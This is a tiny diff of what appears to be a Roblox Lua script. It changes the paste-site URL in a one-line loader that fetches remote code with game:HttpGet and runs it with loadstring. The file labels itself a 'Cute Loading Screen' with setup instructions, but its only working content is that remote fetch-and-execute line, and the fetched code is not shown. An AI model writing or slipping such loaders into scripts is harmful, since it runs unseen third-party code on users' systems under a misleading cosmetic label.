@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ZGvT2kQctt5U4Qnh/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/hsSU7huK/raw"))()
 --// Cute Loading Screen
 --// Put this in StarterGui > LocalScript
 
